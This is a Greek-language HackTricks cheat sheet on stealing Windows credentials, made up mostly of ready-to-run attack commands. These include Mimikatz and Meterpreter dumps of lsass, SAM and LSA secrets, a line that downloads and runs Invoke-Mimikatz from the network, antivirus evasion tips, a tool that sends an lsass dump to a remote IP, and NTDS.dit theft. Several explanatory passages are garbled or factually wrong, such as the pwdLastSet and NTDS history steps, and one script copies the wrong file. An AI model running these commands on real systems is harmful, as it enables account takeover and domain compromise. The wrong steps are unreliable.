# Κλοπή Διαπιστευτηρίων Windows

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Κλοπή Διαπιστευτηρίων Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Βρείτε άλλες λειτουργίες που μπορεί να εκτελέσει το Mimikatz** [**εδώ**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Μάθετε για μερικές πιθανές προστασίες διαπιστευτηρίων εδώ.**](credentials-protections.md) **Αυτές οι προστασίες μπορούν να εμποδίσουν το Mimikatz από την εξαγωγή ορισμένων διαπιστευτηρίων.**

## Διαπιστευτήρια με το Meterpreter

Χρησιμοποιήστε το [**Πρόσθετο Διαπιστευτηρίων**](https://github.com/carlospolop/MSF-Credentials) **που έχω δημιουργήσει για να αναζητήσετε κωδικούς πρόσβασης και κατακερματισμένα δεδομένα** μέσα στο θύμα.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Παράκαμψη του AV

### Procdump + Mimikatz

Καθώς το **Procdump από** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**είναι ένα νόμιμο εργαλείο της Microsoft**, δεν ανιχνεύεται από τον Defender.\
Μπορείτε να χρησιμοποιήσετε αυτό το εργαλείο για να **καταγράψετε τη διεργασία lsass**, **να κατεβάσετε την καταγραφή** και **να εξάγετε τα διαπιστευτήρια τοπικά** από την καταγραφή.

{% code title="Καταγραφή του lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% code title="Εξαγωγή διαπιστευτηρίων από το dump" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

Αυτή η διαδικασία γίνεται αυτόματα με το [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Σημείωση**: Ορισμένα **AV** μπορεί να ανιχνεύσουν ως κακόβουλη τη χρήση του **procdump.exe για να κατεβάσει το lsass.exe**, αυτό συμβαίνει επειδή ανιχνεύουν τις συμβολοσειρές **"procdump.exe" και "lsass.exe"**. Επομένως, είναι πιο αόρατο να περάσετε ως **όρισμα** το **PID** του lsass.exe στο procdump **αντί για** το όνομα lsass.exe.

### Κατεβάζοντας το lsass με το **comsvcs.dll**

Ένα DLL με το όνομα **comsvcs.dll** που βρίσκεται στο `C:\Windows\System32` είναι υπεύθυνο για το **κατέβασμα της μνήμης διεργασίας** σε περίπτωση κατάρρευσης. Αυτό το DLL περιλαμβάνει μια **συνάρτηση** με το όνομα **`MiniDumpW`**, σχεδιασμένη να κληθεί χρησιμοποιώντας το `rundll32.exe`.\
Δεν έχει σημασία να χρησιμοποιηθούν τα πρώτα δύο ορίσματα, αλλά το τρίτο χωρίζεται σε τρία μέρη. Το πρώτο μέρος αποτελείται από το αναγνωριστικό της διεργασίας που θα κατεβαστεί, το δεύτερο μέρος αντιπροσωπεύει την τοποθεσία του αρχείου κατεβάσματος και το τρίτο μέρος είναι αυστηρά η λέξη **full**. Δεν υπάρχουν εναλλακτικές επιλογές.\
Μετά την ανάλυση αυτών των τριών μερών, το DLL αρχίζει να δημιουργεί το αρχείο κατεβάσματος και να μεταφέρει τη μνήμη της καθορισμένης διεργασίας σε αυτό το αρχείο.\
Η χρήση του **comsvcs.dll** είναι εφικτή για το κατέβασμα της διεργασίας lsass, εξαλείφοντας έτσι την ανάγκη για μεταφόρτωση και εκτέλεση του procdump. Αυτή η μέθοδος περιγράφεται αναλυτικά στο [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Χρησιμοποιείται η παρακάτω εντολή για την εκτέλεση:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Μπορείτε να αυτοματοποιήσετε αυτήν τη διαδικασία με το** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Αποθήκευση του lsass με το Task Manager**

1. Δεξί κλικ στη γραμμή εργασιών και κάντε κλικ στο Task Manager
2. Κάντε κλικ στο Περισσότερες λεπτομέρειες
3. Αναζητήστε τη διεργασία "Local Security Authority Process" στην καρτέλα Διεργασίες
4. Δεξί κλικ στη διεργασία "Local Security Authority Process" και κάντε κλικ στο "Δημιουργία αρχείου αποθήκευσης (dump)".

### Αποθήκευση του lsass με το procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) είναι ένα υπογεγραμμένο από τη Microsoft δυαδικό αρχείο που αποτελεί μέρος του [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) συλλογής.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Αποκτήστε πρόσβαση στο lsass με το PPLBlade

Το [**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) είναι ένα εργαλείο για την αποκατάσταση Προστατευμένων Διεργασιών που υποστηρίζει την απόκρυψη του αρχείου αντιγράφου μνήμης και τη μεταφορά του σε απομακρυσμένους υπολογιστές χωρίς να το αποθηκεύει στον δίσκο.

**Βασικές λειτουργίες**:

1. Παράκαμψη της προστασίας PPL
2. Απόκρυψη των αρχείων αντιγράφου μνήμης για να αποφευχθούν οι μηχανισμοί ανίχνευσης βάσει υπογραφής του Defender
3. Μεταφόρτωση αρχείου αντιγράφου μνήμης με τις μεθόδους RAW και SMB χωρίς να το αποθηκεύσει στον δίσκο (αντιγραφή χωρίς αρχείο) 

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### Αποκατάσταση των κατακερματισμένων τιμών του SAM
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Αποκατάσταση μυστικών LSA

Η αποκατάσταση των μυστικών LSA είναι μια τεχνική που χρησιμοποιείται για την ανάκτηση διαπιστευτηρίων από τον τοπικό αποθηκευτή LSA (Local Security Authority) σε ένα σύστημα Windows. Τα μυστικά LSA περιέχουν ευαίσθητες πληροφορίες, όπως κωδικούς πρόσβασης και πιστοποιητικά, που χρησιμοποιούνται από το σύστημα για την αυθεντικοποίηση χρηστών και εφαρμογών.

Για να αποκτήσουμε πρόσβαση στα μυστικά LSA, χρησιμοποιούμε το εργαλείο `lsadump` που παρέχεται από το πλαίσιο εργαλείων Impacket. Αυτό το εργαλείο μας επιτρέπει να ανακτήσουμε τα μυστικά LSA από το αρχείο αποθήκευσης τους στο σύστημα.

Για να εκτελέσουμε την αποκατάσταση των μυστικών LSA, ακολουθούμε τα παρακάτω βήματα:

1. Εγκαθιστούμε το πλαίσιο εργαλείων Impacket στο σύστημά μας.
2. Εκτελούμε την εντολή `lsadump` με τις κατάλληλες παραμέτρους για να ανακτήσουμε τα μυστικά LSA.
3. Αναλύουμε τα αποτελέσματα για να εξάγουμε τα διαπιστευτήρια που χρειαζόμαστε.

Με αυτόν τον τρόπο, μπορούμε να αποκτήσουμε πρόσβαση σε ευαίσθητες πληροφορίες που αποθηκεύονται στα μυστικά LSA του συστήματος Windows. Είναι σημαντικό να σημειωθεί ότι αυτή η τεχνική πρέπει να χρησιμοποιείται μόνο για νόμιμους σκοπούς, όπως την ασφάλεια του συστήματος και την αποκατάσταση χαμένων διαπιστευτηρίων.
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Αντλήστε το NTDS.dit από τον στόχο DC

To dump the NTDS.dit file from a target Domain Controller (DC), you can use various techniques. Here are a few methods:

#### Method 1: Using ntdsutil
1. Open a command prompt with administrative privileges on your attacker machine.
2. Run the following command to open the ntdsutil tool:
```
ntdsutil
```
3. Inside the ntdsutil tool, run the following commands:
```
activate instance ntds
ifm
create full C:\path\to\output\folder
```
Replace `C:\path\to\output\folder` with the desired path where you want to save the NTDS.dit file.
4. Exit the ntdsutil tool by running the following command:
```
quit
```
5. The NTDS.dit file will be saved in the specified output folder.

#### Method 2: Using secretsdump.py
1. Download the `secretsdump.py` script from the Impacket repository.
2. Open a command prompt with administrative privileges on your attacker machine.
3. Run the following command to dump the NTDS.dit file:
```
python secretsdump.py -just-dc-ntlm <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_DC_IP>
```
Replace `<DOMAIN>`, `<USERNAME>`, `<PASSWORD>`, and `<TARGET_DC_IP>` with the appropriate values.
4. The NTDS.dit file will be dumped and displayed in the command prompt.

#### Method 3: Using Mimikatz
1. Download the Mimikatz tool from the official repository.
2. Open a command prompt with administrative privileges on your attacker machine.
3. Run the following command to load the Mimikatz module:
```
mimikatz
```
4. Inside the Mimikatz tool, run the following commands:
```
lsadump::lsa /inject /name:ntds
lsadump::dcsync /domain:<DOMAIN> /all /csv
```
Replace `<DOMAIN>` with the target domain name.
5. The NTDS.dit file will be dumped and saved in the current directory.

Remember to use these techniques responsibly and only on authorized systems.
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Ανάκτηση ιστορικού κωδικών NTDS.dit από τον στόχο DC

Για να ανακτήσετε το ιστορικό κωδικών NTDS.dit από έναν στόχο DC, μπορείτε να ακολουθήσετε τα παρακάτω βήματα:

1. Εκτελέστε το εργαλείο `ntdsutil` στον στόχο DC.
2. Εισάγετε την εντολή `activate instance ntds`.
3. Εισάγετε την εντολή `ifm`.
4. Επιλέξτε τον φάκελο προορισμού για την εξαγωγή των αρχείων NTDS.dit.
5. Αντιγράψτε τα αρχεία NTDS.dit και NTDS.dit.log από τον φάκελο προορισμού στον υπολογιστή σας.

Με αυτόν τον τρόπο, θα έχετε αντίγραφα των αρχείων NTDS.dit και NTDS.dit.log από τον στόχο DC, τα οποία περιέχουν το ιστορικό κωδικών που μπορείτε να αναλύσετε για περαιτέρω ανάλυση και εκμετάλλευση.
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Εμφάνιση του χαρακτηριστικού pwdLastSet για κάθε λογαριασμό NTDS.dit

Για να εμφανίσετε το χαρακτηριστικό pwdLastSet για κάθε λογαριασμό στο αρχείο NTDS.dit, μπορείτε να ακολουθήσετε τα παρακάτω βήματα:

1. Ανοίξτε μια κονσόλα εντολών.
2. Εκτελέστε την εντολή `ntdsutil` για να ανοίξετε το εργαλείο NTDSUtil.
3. Εκτελέστε την εντολή `activate instance ntds` για να ενεργοποιήσετε την ενότητα NTDS.
4. Εκτελέστε την εντολή `ifm` για να μεταβείτε στη λειτουργία IFM (Install From Media).
5. Εκτελέστε την εντολή `create full <path>` για να δημιουργήσετε ένα πλήρες αντίγραφο ασφαλείας του NTDS.dit σε έναν καθορισμένο φάκελο.
6. Μεταβείτε στον φάκελο όπου δημιουργήθηκε το αντίγραφο ασφαλείας του NTDS.dit.
7. Εκτελέστε την εντολή `esentutl /p ntds.dit` για να επισκευάσετε το αρχείο NTDS.dit.
8. Εκτελέστε την εντολή `ntdsutil` για να ανοίξετε ξανά το εργαλείο NTDSUtil.
9. Εκτελέστε την εντολή `activate instance ntds` για να ενεργοποιήσετε την ενότητα NTDS.
10. Εκτελέστε την εντολή `semantic database analysis` για να αναλύσετε τη σημασιολογική βάση δεδομένων.
11. Εκτελέστε την εντολή `go` για να ξεκινήσει η ανάλυση.
12. Αφού ολοκληρωθεί η ανάλυση, θα εμφανιστεί η λίστα των λογαριασμών NTDS.dit με το χαρακτηριστικό pwdLastSet για καθέναν από αυτούς.
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Κλοπή των αρχείων SAM & SYSTEM

Αυτά τα αρχεία πρέπει να βρίσκονται στο _C:\windows\system32\config\SAM_ και _C:\windows\system32\config\SYSTEM._ Ωστόσο, **δεν μπορείτε απλά να τα αντιγράψετε με τον συνηθισμένο τρόπο** επειδή είναι προστατευμένα.

### Από το Μητρώο (Registry)

Ο ευκολότερος τρόπος για να κλέψετε αυτά τα αρχεία είναι να πάρετε ένα αντίγραφο από το μητρώο (registry):
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Κατεβάστε** αυτά τα αρχεία στη μηχανή σας Kali και **εξαγάγετε τις κατακερματισμένες τιμές** χρησιμοποιώντας:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Αντίγραφο Σκιών Όγκου

Μπορείτε να πραγματοποιήσετε αντίγραφο των προστατευμένων αρχείων χρησιμοποιώντας αυτήν την υπηρεσία. Χρειάζεστε να είστε Διαχειριστής.

#### Χρήση του vssadmin

Το δυαδικό αρχείο vssadmin είναι διαθέσιμο μόνο στις εκδόσεις των Windows Server.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Αλλά μπορείτε να κάνετε το ίδιο από το **Powershell**. Αυτό είναι ένα παράδειγμα **πώς να αντιγράψετε το αρχείο SAM** (η σκληρή δίσκος που χρησιμοποιείται είναι ο "C:" και αποθηκεύεται στο C:\users\Public), αλλά μπορείτε να χρησιμοποιήσετε αυτό για να αντιγράψετε οποιοδήποτε προστατευμένο αρχείο:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Κώδικας από το βιβλίο: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Τέλος, μπορείτε επίσης να χρησιμοποιήσετε το [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) για να δημιουργήσετε αντίγραφο των αρχείων SAM, SYSTEM και ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Διαπιστευτήρια Active Directory - NTDS.dit**

Το αρχείο **NTDS.dit** είναι γνωστό ως η καρδιά του **Active Directory**, καθώς περιέχει κρίσιμα δεδομένα σχετικά με αντικείμενα χρηστών, ομάδες και την συμμετοχή τους. Εδώ αποθηκεύονται οι **κατακερματισμένες κωδικές λέξεις πρόσβασης** για τους χρήστες του τομέα. Αυτό το αρχείο είναι μια βάση δεδομένων **Extensible Storage Engine (ESE)** και βρίσκεται στη διαδρομή **_%SystemRoom%/NTDS/ntds.dit_**.

Μέσα σε αυτήν τη βάση δεδομένων, διατηρούνται τρεις κύριοι πίνακες:

- **Πίνακας Δεδομένων**: Αυτός ο πίνακας αποθηκεύει λεπτομέρειες σχετικά με αντικείμενα όπως χρήστες και ομάδες.
- **Πίνακας Συνδέσεων**: Διατηρεί τις σχέσεις, όπως τη συμμετοχή σε ομάδες.
- **Πίνακας SD**: Εδώ αποθηκεύονται οι **ασφαλείς περιγραφές** για κάθε αντικείμενο, εξασφαλίζοντας την ασφάλεια και τον έλεγχο πρόσβασης για τα αποθηκευμένα αντικείμενα.

Περισσότερες πληροφορίες για αυτό: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Τα Windows χρησιμοποιούν το _Ntdsa.dll_ για να αλληλεπιδράσουν με αυτό το αρχείο και χρησιμοποιείται από το _lsass.exe_. Έτσι, μέρος του αρχείου **NTDS.dit** μπορεί να βρίσκεται **μέσα στη μνήμη του `lsass`** (μπορείτε να βρείτε τα πιο πρόσφατα προσπελασμένα δεδομένα πιθανότατα λόγω της βελτίωσης της απόδοσης με τη χρήση μιας **μνήμης cache**).

#### Αποκρυπτογράφηση των κατακερματισμένων λέξεων πρόσβασης μέσα στο NTDS.dit

Ο κατακερματισμένος κωδικός λέξης πρόσβασης κρυπτογραφείται 3 φορές:

1. Αποκρυπτογράφηση του Κλειδιού Κρυπτογράφησης Κωδικού Πρόσβασης (**PEK**) χρησιμοποιώντας το **BOOTKEY** και το **RC4**.
2. Αποκρυπτογράφηση του **κατακερματισμένου κωδικού** χρησιμοποιώντας το **PEK** και το **RC4**.
3. Αποκρυπτογράφηση του **κατακερματισμένου κωδικού** χρησιμοποιώντας το **DES**.

Το **PEK** έχει την **ίδια τιμή** σε **κάθε ελεγκτή τομέα**, αλλά κρυπτογραφείται μέσα στο αρχείο **NTDS.dit** χρησιμοποιώντας το **BOOTKEY** του **αρχείου SYSTEM του ελεγκτή τομέα (διαφέρει μεταξύ των ελεγκτών τομέα)**. Για αυτόν τον λόγο, για να αποκτήσετε τα διαπιστευτήρια από το αρχείο NTDS.dit, **χρειάζεστε τα αρχεία NTDS.dit και SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Αντιγραφή του NTDS.dit χρησιμοποιώντας το Ntdsutil

Διαθέσιμο από το Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Μπορείτε επίσης να χρησιμοποιήσετε το κόλπο του [**volume shadow copy**](./#stealing-sam-and-system) για να αντιγράψετε το αρχείο **ntds.dit**. Θυμηθείτε ότι θα χρειαστείτε επίσης ένα αντίγραφο του αρχείου **SYSTEM** (ξαναχρησιμοποιήστε τον κόλπο του [**dump it from the registry or use the volume shadow copy**](./#stealing-sam-and-system)).

### **Εξαγωγή κατακερματισμένων τιμών από το NTDS.dit**

Αφού έχετε **αποκτήσει** τα αρχεία **NTDS.dit** και **SYSTEM**, μπορείτε να χρησιμοποιήσετε εργαλεία όπως το _secretsdump.py_ για να **εξάγετε τις κατακερματισμένες τιμές**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Μπορείτε επίσης να τα **εξάγετε αυτόματα** χρησιμοποιώντας έναν έγκυρο χρήστη διαχειριστή του τομέα:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Για τα **μεγάλα αρχεία NTDS.dit** συνιστάται να το εξάγετε χρησιμοποιώντας το [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Τέλος, μπορείτε επίσης να χρησιμοποιήσετε το **module metasploit**: _post/windows/gather/credentials/domain\_hashdump_ ή το **mimikatz** `lsadump::lsa /inject`

### **Εξαγωγή αντικειμένων του τομέα από το NTDS.dit σε μια βάση δεδομένων SQLite**

Τα αντικείμενα NTDS μπορούν να εξαχθούν σε μια βάση δεδομένων SQLite με το [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Όχι μόνο εξάγονται τα μυστικά, αλλά και τα ολόκληρα αντικείμενα και οι ιδιότητές τους για περαιτέρω εξαγωγή πληροφοριών όταν έχει ήδη ανακτηθεί το αρχείο NTDS.dit.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Το `SYSTEM` hive είναι προαιρετικό, αλλά επιτρέπει την αποκρυπτογράφηση μυστικών (NT & LM hashes, πρόσθετα διαπιστευτήρια όπως καθαρό κείμενο κωδικού πρόσβασης, κλειδιά kerberos ή εμπιστοσύνης, ιστορικά κωδικών NT & LM). Μαζί με άλλες πληροφορίες, εξάγονται οι εξής δεδομένες: λογαριασμοί χρηστών και μηχανών με τα hashes τους, σημαίες UAC, χρονική σήμανση τελευταίας σύνδεσης και αλλαγής κωδικού πρόσβασης, περιγραφή λογαριασμών, ονόματα, UPN, SPN, ομάδες και αναδρομική συμμετοχή, δέντρο μονάδων οργανισμού και συμμετοχή, αξιόπιστους τομείς με τύπο εμπιστοσύνης, κατεύθυνση και χαρακτηριστικά...

## Lazagne

Κατεβάστε το δυαδικό αρχείο από [εδώ](https://github.com/AlessandroZ/LaZagne/releases). Μπορείτε να χρησιμοποιήσετε αυτό το δυαδικό αρχείο για να εξάγετε διαπιστευτήρια από διάφορο λογισμικό.
```
lazagne.exe all
```
## Άλλα εργαλεία για την εξαγωγή διαπιστευτηρίων από τα αρχεία SAM και LSASS

### Windows credentials Editor (WCE)

Αυτό το εργαλείο μπορεί να χρησιμοποιηθεί για την εξαγωγή διαπιστευτηρίων από τη μνήμη. Κατεβάστε το από: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Εξαγάγετε διαπιστευτήρια από το αρχείο SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Εξαγωγή διαπιστευτηρίων από το αρχείο SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Κατεβάστε το από: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) και απλά **εκτελέστε το** και οι κωδικοί πρόσβασης θα εξαχθούν.

## Αμυντικές Μέθοδοι

[**Μάθετε για μερικές προστασίες διαπιστευτηρίων εδώ.**](credentials-protections.md)

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Συμμετάσχετε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
